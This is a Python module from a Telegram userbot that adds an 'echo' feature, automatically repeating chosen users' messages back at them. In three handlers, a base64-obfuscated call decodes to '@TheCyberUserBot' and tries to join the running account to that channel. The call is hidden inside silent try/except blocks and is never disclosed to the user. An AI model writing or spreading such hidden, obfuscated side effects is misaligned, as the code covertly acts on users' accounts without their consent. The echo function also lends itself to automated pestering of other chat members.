# Copyright (C) 2021-2022 CyberUserBot
# This file is a part of < https://github.com/FaridDadashzade/CyberUserBot/ >
# Please read the GNU General Public License v3.0 in
# <https://www.github.com/FaridDadashzade/CyberUserBot/blob/master/LICENSE/>.

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import BLACKLIST_CHAT
from userbot.modules.sql_helper.echo_sql import (
    echoelave,
    echosiyahisi,
    c_echo,
    esil,
)
from userbot.events import register
from userbot.cmdhelp import CmdHelp

MAX_MESSAGE_SIZE_LIMIT = 4095

@register(cyber=True, pattern=r"^\.echo(?: |$)(.*)")
async def echo(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = event.chat_id
        try:
            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
            sifrele = Get(sifrele)
            await event.client(sifrele)
        except BaseException:
            pass
        if c_echo(user_id, chat_id):
            await event.edit("`Bu istifadəçi onsuzda Echo siyahısındadır.`")
            return
        echoelave(user_id, chat_id)
        await event.edit("`Echo aktiv edildi!`")
    else:
        await event.edit("**Echo aktiv olunacaq istifadəçinin mesajına cavab verin.**")

@register(cyber=True, pattern=r"^\.rmecho(?: |$)(.*)")
@register(cyber=True, pattern=r"^\.echosil(?: |$)(.*)")
async def echosil(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = event.chat_id
        try:
            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
            sifrele = Get(sifrele)
            await event.client(sifrele)
        except BaseException:
            pass
        if c_echo(user_id, chat_id):
            esil(user_id, chat_id)
            await event.edit("`Echo bu istifadəçi üçün deaktiv edildi.`")
        else:
            await event.edit("`Bu istifadəçi üçün echo modulu aktiv edilməyib.`")
    else:
        await event.edit("`Echo siyahısından silə bilməyim üçün bir istifadəçinin mesajına cavab verin.`")

@register(cyber=True, pattern=r"^\.echolist(?: |$)(.*)")
@register(cyber=True, pattern="^.echosiyahi ?(.*)")
async def echosiyah(event):
    if event.fwd_from:
        return
    lsts = echosiyahisi()
    if len(lsts) > 0:
        output_str = "Echo aktiv edilən istifadəçilər:\n\n"
        for echos in lsts:
            output_str += (
                f"Adı: [İstifadəçi](tg://user?id={echos.user_id}) ID: `{echos.chat_id}`\n"
            )
    else:
        output_str = "Bu istifadəçi Echo deyil "
    if len(output_str) > MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo aktiv edilən istifadəçilər [buradadır.]({url})"
        await event.edit(reply_text)
    else:
        await event.edit(output_str)      
    
        

@register(incoming=True)
async def echocavab(event):
    if event.chat_id in BLACKLIST_CHAT:
        return
    if c_echo(event.sender_id, event.chat_id):
        await asyncio.sleep(2)
        try:
            sifrele = base64.b64decode("QFRoZUN5YmVyVXNlckJvdA==")
            sifrele = Get(sifrele)
            await event.client(sifrele)
        except BaseException:
            pass
        if event.message.text or event.message.sticker:
            await event.reply(event.message)


CmdHelp("echo").add_command(
  'echo', 'Bir istifadəçiyə cavab verin', 'Cavab verdiyiniz istifadəçini echoya əlavə edər.'
).add_command(
  'echosil, rmecho', 'Bir istifadəçiyə cavab verin', 'Cavab verdiyiniz istifadəçini siyahıdan silər.'
).add_command(
  'echosiyahi, echolist', None, 'Echo aktiv edilən istifadəçilərin siyahısını gətirər.'
).add()
